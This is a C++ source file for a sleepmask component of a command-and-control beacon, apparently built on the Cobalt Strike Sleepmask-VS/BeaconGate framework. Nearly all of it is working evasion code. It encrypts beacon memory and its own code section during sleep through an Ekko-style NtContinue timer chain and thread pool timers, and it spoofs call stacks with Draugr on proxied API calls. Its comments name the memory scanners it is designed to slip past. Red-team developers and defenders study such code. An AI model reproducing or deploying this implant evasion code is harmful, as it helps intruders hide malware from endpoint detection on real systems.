#include <windows.h>

#include "base\helpers.h"
#include "sleepmask.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "beacon_gate.h"

#include "sleepmask-vs.h"
#include "library\debug.cpp"
#include "library\utils.cpp"
#include "library\stdlib.cpp"
#include "library\masking.cpp"
#include "library\gate.cpp"

/**
* Thread Pool Timer sleepmask with Draugr stack spoofing and self-masking.
*
* This implementation uses Technique 4: Thread Pool Timers
* (TpAllocTimer + TpSetTimerEx) for sleep obfuscation, combined
* with Draugr call stack spoofing for all proxied BeaconGate
* API calls.
*
* Self-masking uses an Ekko-style NtContinue timer chain to
* encrypt the sleepmask's own .text section via SystemFunction032
* (advapi32) during sleep.
*
* Thread pool worker threads wait via NtWaitForWorkViaWorkerFactory
* which is explicitly whitelisted by PE-sieve's ThreadScanner.
*/

// Thread Pool Timers + Draugr are only supported on x64.
#ifdef _WIN64
// Additional includes for draugr.
#include "library\stackspoofing.cpp"

#ifndef _DEBUG
// --- Thread pool timer APIs (existing) ---
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$TpAllocTimer(PTP_TIMER* out, PTP_TIMER_CALLBACK callback, PVOID context, PTP_CALLBACK_ENVIRON env);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$TpSetTimerEx(PTP_TIMER timer, PLARGE_INTEGER dueTime, LONG period, LONG window);
DECLSPEC_IMPORT VOID     NTAPI NTDLL$TpReleaseTimer(PTP_TIMER timer);

// --- Event / wait APIs ---
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtCreateEvent(PHANDLE eventHandle, ACCESS_MASK desiredAccess, PVOID objectAttributes, DWORD eventType, BOOLEAN initialState);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSetEvent(HANDLE eventHandle, PLONG previousState);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtWaitForSingleObject(HANDLE handle, BOOLEAN alertable, PLARGE_INTEGER timeout);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSignalAndWaitForSingleObject(HANDLE signalHandle, HANDLE waitHandle, BOOLEAN alertable, PLARGE_INTEGER timeout);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE handle);

// --- Timer queue APIs for self-masking (Ekko chain) ---
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlCreateTimerQueue(PHANDLE timerQueueHandle);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlCreateTimer(HANDLE timerQueueHandle, PHANDLE timerHandle, PVOID callback, PVOID context, DWORD dueTime, DWORD period, ULONG flags);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlDeleteTimerQueue(HANDLE timerQueueHandle);

// --- Context capture ---
DECLSPEC_IMPORT VOID NTAPI NTDLL$RtlCaptureContext(PCONTEXT ContextRecord);

// --- Module / proc resolution APIs ---
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);

#define TpAllocTimer          NTDLL$TpAllocTimer
#define TpSetTimerEx          NTDLL$TpSetTimerEx
#define TpReleaseTimer        NTDLL$TpReleaseTimer
#define NtCreateEvent         NTDLL$NtCreateEvent
#define NtSetEvent            NTDLL$NtSetEvent
#define NtWaitForSingleObject NTDLL$NtWaitForSingleObject
#define NtSignalAndWaitForSingleObject NTDLL$NtSignalAndWaitForSingleObject
#define NtClose               NTDLL$NtClose
#define RtlCreateTimerQueue   NTDLL$RtlCreateTimerQueue
#define RtlCreateTimer        NTDLL$RtlCreateTimer
#define RtlDeleteTimerQueue   NTDLL$RtlDeleteTimerQueue
#define RtlCaptureContext     NTDLL$RtlCaptureContext
#define LoadLibraryA          KERNEL32$LoadLibraryA
#define GetProcAddress        KERNEL32$GetProcAddress
#define GetModuleHandleA      KERNEL32$GetModuleHandleA
#else
typedef NTSTATUS(NTAPI* TpAllocTimerPtr)(PTP_TIMER*, PTP_TIMER_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
typedef NTSTATUS(NTAPI* TpSetTimerExPtr)(PTP_TIMER, PLARGE_INTEGER, LONG, LONG);
typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
#endif

    // EVENT_TYPE values for NtCreateEvent (may not be in mingw headers).
    #ifndef EVENT_TYPE_NOTIFICATION
    #define EVENT_TYPE_NOTIFICATION     0
    #endif
    #ifndef EVENT_TYPE_SYNCHRONIZATION
    #define EVENT_TYPE_SYNCHRONIZATION  1
    #endif

    #ifndef NT_SUCCESS
    #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
    #endif

    // --- USTRING for SystemFunction032 ---
    typedef struct _USTRING {
        DWORD Length;
        DWORD MaximumLength;
        PVOID Buffer;
    } USTRING, *PUSTRING;

    // --- SystemFunction032 typedef ---
    typedef NTSTATUS (WINAPI *SystemFunction032_t)(PUSTRING data, PUSTRING key);

    // --- Resolved function pointers for self-masking ---
    static SystemFunction032_t   pSystemFunction032     = NULL;
    static LPVOID                pVirtualProtect        = NULL;
    static LPVOID                pNtContinue            = NULL;
    static LPVOID                pNtTestAlert           = NULL;
    static LPVOID                pWaitForSingleObjectEx = NULL;
    static LPVOID                pSetEvent              = NULL;
    static LPVOID                pRtlCaptureContext     = NULL;
    static BOOL                  selfMaskReady          = FALSE;

    /**
    * Resolve function pointers needed for the self-masking timer chain.
    * Called once during initialization.
    *
    * @return TRUE if all pointers were resolved successfully.
    */
    BOOL InitSelfMask() {
        HMODULE hNtdll    = GetModuleHandleA("ntdll.dll");
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");

        if (!hNtdll || !hKernel32 || !hAdvapi32) {
            DLOG("SLEEPMASK: Failed to resolve modules for self-masking\n");
            return FALSE;
        }

        pSystemFunction032     = (SystemFunction032_t)GetProcAddress(hAdvapi32, "SystemFunction032");
        pVirtualProtect        = (LPVOID)GetProcAddress(hKernel32, "VirtualProtect");
        pNtContinue            = (LPVOID)GetProcAddress(hNtdll, "NtContinue");
        pNtTestAlert           = (LPVOID)GetProcAddress(hNtdll, "NtTestAlert");
        pWaitForSingleObjectEx = (LPVOID)GetProcAddress(hKernel32, "WaitForSingleObjectEx");
        pSetEvent              = (LPVOID)GetProcAddress(hKernel32, "SetEvent");
        pRtlCaptureContext     = (LPVOID)GetProcAddress(hNtdll, "RtlCaptureContext");

        if (!pSystemFunction032 || !pVirtualProtect || !pNtContinue ||
            !pNtTestAlert || !pWaitForSingleObjectEx || !pSetEvent ||
            !pRtlCaptureContext) {
            DLOG("SLEEPMASK: Failed to resolve function pointers for self-masking\n");
            return FALSE;
        }

        DLOG("SLEEPMASK: Self-masking function pointers resolved\n");
        return TRUE;
    }

    /**
    * Thread pool timer context passed to the timer callback.
    * Contains everything needed for the decrypt-and-wake cycle.
    */
    typedef struct _TP_TIMER_CONTEXT {
        PBEACON_INFO   BeaconInfo;
        HANDLE         hWakeEvent;
    } TP_TIMER_CONTEXT, *PTP_TIMER_CONTEXT;

    /**
    * Timer queue wake callback (T6) — WAITORTIMERCALLBACK signature.
    *
    * By the time this fires, the sleepmask code has been decrypted (T4)
    * and restored to RX (T5), so this callback can execute normally.
    * It unmasks beacon memory and signals the main thread to wake.
    *
    * @param Context          Pointer to TP_TIMER_CONTEXT.
    * @param TimerOrWaitFired TRUE if the timer expired.
    */
    static VOID CALLBACK WakeCallback(PVOID Context, BOOLEAN TimerOrWaitFired) {
        PTP_TIMER_CONTEXT ctx = (PTP_TIMER_CONTEXT)Context;

        UnMaskBeacon(ctx->BeaconInfo);
        NtSetEvent(ctx->hWakeEvent, NULL);
    }

    /**
    * Configures Draugr for use in BeaconGate.
    *
    * @param pDraugrCall A pointer to a DRAUGR_FUNCTION_CALL structure.
    */
    void InitializeDraugr(PDRAUGR_FUNCTION_CALL pDraugrCall) {
        // [0] Prepare spoofed stack frame struct.
        static SYNTHETIC_STACK_FRAME stackFrame;
        _memset(&stackFrame, 0, sizeof(stackFrame));

        // [1] Attempt to resolve spoofed call stack frame.
        if (!InitFrameInfo(&stackFrame)) {
            goto Cleanup;
        }

        // [2] Set target stack frame and call gate entry point.
        pDraugrCall->StackFrame = &stackFrame;
        pDraugrCall->SpoofCall = (PVOID)SpoofCall;
        DLOGF("SLEEPMASK: Successfully configured Draugr\n");

    Cleanup:
        return;
    }

    /**
    * Performs a thread pool timer sleep cycle with self-masking.
    *
    * Uses an Ekko-style NtContinue timer chain to encrypt the sleepmask's
    * own .text section during sleep via SystemFunction032 (advapi32).
    *
    * Context is captured on the timer thread itself (via RtlCaptureContext
    * as a timer callback), eliminating the race condition of capturing on
    * the main thread. Three events synchronize the phases:
    *   - EvntTimer: signals that context capture is complete
    *   - EvntStart: gates the chain until main thread is ready
    *   - EvntEnd:   signals chain completion to wake main thread
    *
    * Timer chain (WT_EXECUTEINTIMERTHREAD, serialized):
    *   Setup:  RtlCaptureContext → SetEvent(EvntTimer)
    *   Ctx[0]: WaitForSingleObjectEx(EvntStart, INFINITE) — gate
    *   Ctx[1]: VirtualProtect(sleepmask, PAGE_READWRITE)
    *   Ctx[2]: SystemFunction032(encrypt sleepmask code)
    *   Ctx[3]: WaitForSingleObjectEx(NtCurrentProcess, sleepMs) — sleep
    *   Ctx[4]: SystemFunction032(decrypt sleepmask code)
    *   Ctx[5]: VirtualProtect(sleepmask, PAGE_EXECUTE_READ)
    *   Ctx[6]: SetEvent(EvntEnd) — wake main thread
    *
    * NtSignalAndWaitForSingleObject atomically unblocks the chain and
    * waits for completion. UnMaskBeacon runs on the main thread after wake.
    *
    * Falls back to basic TpAllocTimer sleep if self-masking is unavailable.
    *
    * @param info      A pointer to a BEACON_INFO structure.
    * @param sleepMs   The sleep duration in milliseconds.
    */
    void ThreadPoolTimerSleep(PBEACON_INFO info, DWORD sleepMs) {
        HANDLE       hTimerQueue = NULL;
        HANDLE       hEvntTimer  = NULL;
        HANDLE       hEvntStart  = NULL;
        HANDLE       hEvntEnd    = NULL;
        NTSTATUS     status      = 0;

        // [0] If self-masking is not available, fall back to TpAllocTimer.
        if (!selfMaskReady) {
            HANDLE       hWakeEvent = NULL;
            PTP_TIMER    pTimer = NULL;
            LARGE_INTEGER dueTime;

            status = NtCreateEvent(&hWakeEvent, EVENT_ALL_ACCESS, NULL, EVENT_TYPE_SYNCHRONIZATION, FALSE);
            if (status != 0 || hWakeEvent == NULL) {
                DLOGF("SLEEPMASK: Failed to create wake event: 0x%08X\n", status);
                return;
            }

            TP_TIMER_CONTEXT timerCtx;
            _memset(&timerCtx, 0, sizeof(timerCtx));
            timerCtx.BeaconInfo = info;
            timerCtx.hWakeEvent = hWakeEvent;

            status = TpAllocTimer(&pTimer, (PTP_TIMER_CALLBACK)WakeCallback, &timerCtx, NULL);
            if (status != 0 || pTimer == NULL) {
                DLOGF("SLEEPMASK: Failed to allocate fallback timer: 0x%08X\n", status);
                NtClose(hWakeEvent);
                return;
            }

            dueTime.QuadPart = -((LONGLONG)sleepMs * 10000LL);
            status = TpSetTimerEx(pTimer, &dueTime, 0, 0);
            if (status != 0) {
                TpReleaseTimer(pTimer);
                NtClose(hWakeEvent);
                return;
            }

            MaskBeacon(info);
            NtWaitForSingleObject(hWakeEvent, FALSE, NULL);
            TpReleaseTimer(pTimer);
            NtClose(hWakeEvent);
            return;
        }

        // --- Self-masking path (Ekko-style NtContinue timer chain) ---

        // [1] Save self-masking parameters before MaskBeacon encrypts them.
        char  maskKeyCopy[MASK_SIZE];
        _memcpy(maskKeyCopy, info->mask, MASK_SIZE);
        char* sleepMaskPtr      = info->sleep_mask_ptr;
        DWORD sleepMaskTextSize = info->sleep_mask_text_size;

        // [2] Set up USTRING structs for SystemFunction032.
        USTRING imgData;
        imgData.Length        = sleepMaskTextSize;
        imgData.MaximumLength = sleepMaskTextSize;
        imgData.Buffer        = sleepMaskPtr;

        USTRING imgKey;
        imgKey.Length        = MASK_SIZE;
        imgKey.MaximumLength = MASK_SIZE;
        imgKey.Buffer        = maskKeyCopy;

        // [3] Create three notification events for synchronization.
        //     EvntTimer: signaled when RtlCaptureContext completes on timer thread.
        //     EvntStart: gates the NtContinue chain until main thread is ready.
        //     EvntEnd:   signaled by chain completion to wake main thread.
        if (!NT_SUCCESS(status = NtCreateEvent(&hEvntTimer, EVENT_ALL_ACCESS, NULL, EVENT_TYPE_NOTIFICATION, FALSE)) ||
            !NT_SUCCESS(status = NtCreateEvent(&hEvntStart, EVENT_ALL_ACCESS, NULL, EVENT_TYPE_NOTIFICATION, FALSE)) ||
            !NT_SUCCESS(status = NtCreateEvent(&hEvntEnd,   EVENT_ALL_ACCESS, NULL, EVENT_TYPE_NOTIFICATION, FALSE))) {
            DLOGF("SLEEPMASK: Failed to create events: 0x%08X\n", status);
            goto LEAVE;
        }

        // [4] Create the timer queue.
        status = RtlCreateTimerQueue(&hTimerQueue);
        if (status != 0 || hTimerQueue == NULL) {
            DLOGF("SLEEPMASK: Failed to create timer queue: 0x%08X\n", status);
            goto LEAVE;
        }

        {
            HANDLE  hTimer = NULL;
            DWORD   Delay  = 0;
            DWORD   oldProtect = 0;

            // [5] Queue setup timers: capture context on the timer thread,
            //     then signal EvntTimer so the main thread knows it's done.
            CONTEXT CtxInit;
            _memset(&CtxInit, 0, sizeof(CtxInit));

            if (!NT_SUCCESS(status = RtlCreateTimer(hTimerQueue, &hTimer, pRtlCaptureContext, &CtxInit,
                                                    Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
                DLOGF("SLEEPMASK: RtlCreateTimer(RtlCaptureContext) failed: 0x%08X\n", status);
                goto LEAVE;
            }

            if (!NT_SUCCESS(status = RtlCreateTimer(hTimerQueue, &hTimer, pSetEvent, hEvntTimer,
                                                    Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
                DLOGF("SLEEPMASK: RtlCreateTimer(SetEvent) failed: 0x%08X\n", status);
                goto LEAVE;
            }

            // [6] Wait for the timer thread to finish capturing its context.
            if (!NT_SUCCESS(status = NtWaitForSingleObject(hEvntTimer, FALSE, NULL))) {
                DLOGF("SLEEPMASK: NtWaitForSingleObject(EvntTimer) failed: 0x%08X\n", status);
                goto LEAVE;
            }

            // [7] Build 7 NtContinue CONTEXT structs from the captured timer-thread context.
            //     Static array to avoid exceeding the 4KB stack probe threshold.
            static CONTEXT Ctx[7];

            for (int i = 0; i < 7; i++) {
                _memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
                Ctx[i].Rsp -= sizeof(PVOID);
                *(ULONG_PTR*)(Ctx[i].Rsp) = (ULONG_PTR)pNtTestAlert;
            }

            // Ctx[0]: WaitForSingleObjectEx(EvntStart, INFINITE, NULL) — gate
            Ctx[0].Rip = (DWORD64)pWaitForSingleObjectEx;
            Ctx[0].Rcx = (DWORD64)hEvntStart;
            Ctx[0].Rdx = (DWORD64)INFINITE;
            Ctx[0].R8  = (DWORD64)0;

            // Ctx[1]: VirtualProtect(sleepmask, size, PAGE_READWRITE, &oldProtect)
            Ctx[1].Rip = (DWORD64)pVirtualProtect;
            Ctx[1].Rcx = (DWORD64)sleepMaskPtr;
            Ctx[1].Rdx = (DWORD64)sleepMaskTextSize;
            Ctx[1].R8  = (DWORD64)PAGE_READWRITE;
            Ctx[1].R9  = (DWORD64)&oldProtect;

            // Ctx[2]: SystemFunction032(&imgData, &imgKey) — encrypt
            Ctx[2].Rip = (DWORD64)pSystemFunction032;
            Ctx[2].Rcx = (DWORD64)&imgData;
            Ctx[2].Rdx = (DWORD64)&imgKey;

            // Ctx[3]: WaitForSingleObjectEx(NtCurrentProcess, sleepMs, FALSE) — THE ACTUAL SLEEP
            Ctx[3].Rip = (DWORD64)pWaitForSingleObjectEx;
            Ctx[3].Rcx = (DWORD64)((HANDLE)(LONG_PTR)-1);
            Ctx[3].Rdx = (DWORD64)sleepMs;
            Ctx[3].R8  = (DWORD64)0;

            // Ctx[4]: SystemFunction032(&imgData, &imgKey) — decrypt
            Ctx[4].Rip = (DWORD64)pSystemFunction032;
            Ctx[4].Rcx = (DWORD64)&imgData;
            Ctx[4].Rdx = (DWORD64)&imgKey;

            // Ctx[5]: VirtualProtect(sleepmask, size, PAGE_EXECUTE_READ, &oldProtect)
            Ctx[5].Rip = (DWORD64)pVirtualProtect;
            Ctx[5].Rcx = (DWORD64)sleepMaskPtr;
            Ctx[5].Rdx = (DWORD64)sleepMaskTextSize;
            Ctx[5].R8  = (DWORD64)PAGE_EXECUTE_READ;
            Ctx[5].R9  = (DWORD64)&oldProtect;

            // Ctx[6]: SetEvent(EvntEnd) — wake main thread
            Ctx[6].Rip = (DWORD64)pSetEvent;
            Ctx[6].Rcx = (DWORD64)hEvntEnd;

            // [8] Queue 7 NtContinue timers (chain phase).
            for (int i = 0; i < 7; i++) {
                if (!NT_SUCCESS(status = RtlCreateTimer(hTimerQueue, &hTimer, pNtContinue, &Ctx[i],
                                                        Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
                    DLOGF("SLEEPMASK: RtlCreateTimer(NtContinue[%d]) failed: 0x%08X\n", i, status);
                    goto LEAVE;
                }
            }

            // [9] Mask beacon memory (encrypt sections + heap records).
            MaskBeacon(info);

            // [10] Atomically signal EvntStart (unblocks the timer chain)
            //      and wait on EvntEnd (blocks until chain completes).
            NtSignalAndWaitForSingleObject(hEvntStart, hEvntEnd, FALSE, NULL);

            // [11] Unmask beacon memory — sleepmask code is decrypted + RX.
            UnMaskBeacon(info);
        }

        // [12] Clean up.
    LEAVE:
        if (hTimerQueue) {
            RtlDeleteTimerQueue(hTimerQueue);
        }
        if (hEvntTimer) {
            NtClose(hEvntTimer);
        }
        if (hEvntStart) {
            NtClose(hEvntStart);
        }
        if (hEvntEnd) {
            NtClose(hEvntEnd);
        }

        // Zero the mask key copy.
        volatile char* vKey = maskKeyCopy;
        for (int i = 0; i < MASK_SIZE; i++) {
            vKey[i] = 0;
        }
    }

    /**
    * Sleepmask-VS entry point
    *
    * When BeaconGate routes a SLEEP call, this implementation uses
    * an Ekko-style NtContinue timer chain that encrypts both the
    * beacon memory AND the sleepmask's own .text section during sleep.
    * For all other BeaconGate API calls, Draugr stack spoofing is used.
    *
    * Note: To enable logging for Release builds set ENABLE_LOGGING to
    * 1 in debug.h.
    */
    void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL functionCall) {
        static BOOL draugrInitialized = FALSE;
        static DRAUGR_FUNCTION_CALL draugrCall;

        // [0] If logging is enabled, print relevant debug output.
#if ENABLE_LOGGING
        if (!draugrInitialized) PrintSleepMaskInfo(info);
#endif

        // [1] Initialize Draugr and self-masking.
        if (!draugrInitialized) {
            InitializeDraugr(&draugrCall);
            selfMaskReady = InitSelfMask();
            draugrInitialized = TRUE;
        }

        // [2] Intercept SLEEP calls: use self-masking timer chain.
        if (functionCall->function == WinApi::SLEEP) {
            DWORD sleepMs = (DWORD)(ULONG_PTR)functionCall->args[0];
            DLOGF("SLEEPMASK: Intercepting Sleep(%lu) with self-masking timer chain\n", sleepMs);
            ThreadPoolTimerSleep(info, sleepMs);
            functionCall->retValue = 0;
            return;
        }

        // [3] Intercept WAITFORSINGLEOBJECT: mask beacon during wait.
        //     args[0] = HANDLE, args[1] = dwMilliseconds
        if (functionCall->function == WinApi::WAITFORSINGLEOBJECT) {
            HANDLE hObject   = (HANDLE)functionCall->args[0];
            DWORD  timeoutMs = (DWORD)(ULONG_PTR)functionCall->args[1];
            DLOGF("SLEEPMASK: Intercepting WaitForSingleObject(%p, %lu)\n", hObject, timeoutMs);

            LARGE_INTEGER timeout;
            PLARGE_INTEGER pTimeout = NULL;

            // Convert millisecond timeout to 100-nanosecond intervals (negative = relative).
            // INFINITE (0xFFFFFFFF) maps to NULL (wait forever).
            if (timeoutMs != INFINITE) {
                timeout.QuadPart = -((LONGLONG)timeoutMs * 10000LL);
                pTimeout = &timeout;
            }

            // Mask beacon memory during the wait.
            MaskBeacon(info);

            // Perform the actual wait via NtWaitForSingleObject.
            NTSTATUS status = NtWaitForSingleObject(hObject, FALSE, pTimeout);

            // Unmask beacon memory.
            UnMaskBeacon(info);

            // Return the result. STATUS_SUCCESS, STATUS_TIMEOUT, STATUS_ABANDONED
            // map directly to WAIT_OBJECT_0, WAIT_TIMEOUT, WAIT_ABANDONED.
            functionCall->retValue = (ULONG_PTR)status;
            return;
        }

        // [4] All other API calls: proxy via Draugr with stack spoofing.
        draugrCall.FunctionCall = functionCall;
        DraugrGateWrapper(info, &draugrCall);
        draugrCall.FunctionCall = NULL;

        return;
    }
}
#else
    // x86 fallback: no Draugr, no thread pool timer sleep.
    void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL functionCall) {
        DLOGF("SLEEPMASK: Calling %s via BeaconGate\n", winApiArray[functionCall->function]);
        BeaconGateWrapper(info, functionCall);

        return;
    }
}
#endif

// Define a main function for the debug build
#if defined(_DEBUG)
#include "unit-tests\syscallapi-unit-tests.cpp"
int main(int argc, char* argv[]) {
    /**
    * [0] Run a quick test BeaconGate example.
    * Note: The GateArg() Macro ensures variadic arguments are the correct size for the architecture.
    */
    FUNCTION_CALL functionCall = bof::mock::createFunctionCallStructure(
        (PVOID)VirtualAlloc, // Function Pointer
        WinApi::VIRTUALALLOC, // Human Readable WinApi Enum
        TRUE, // Mask Beacon
        4, // Number of Arguments
        GateArg(NULL),  // VirtualAlloc Arg1
        GateArg(0x1000), // VirtualAlloc Arg2
        GateArg(MEM_RESERVE | MEM_COMMIT), // VirtualAlloc Arg3
        GateArg(PAGE_EXECUTE_READWRITE) // VirtualAlloc Arg4
    );

    bof::runMockedBeaconGate(sleep_mask, &functionCall,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::False,
            .module = "",
        });

    VirtualFree((LPVOID)functionCall.retValue, 0, MEM_RELEASE);

    // [1] Check if asm harness is passing args correctly.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing args are passed correctly");
    TestArgumentsArePassedCorrectlyWrapper();

    // [2] Now test coverage for *all* supported sys calls.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing all supported sys calls");
    TestSysCallApi();

    return 0;
}

#endif
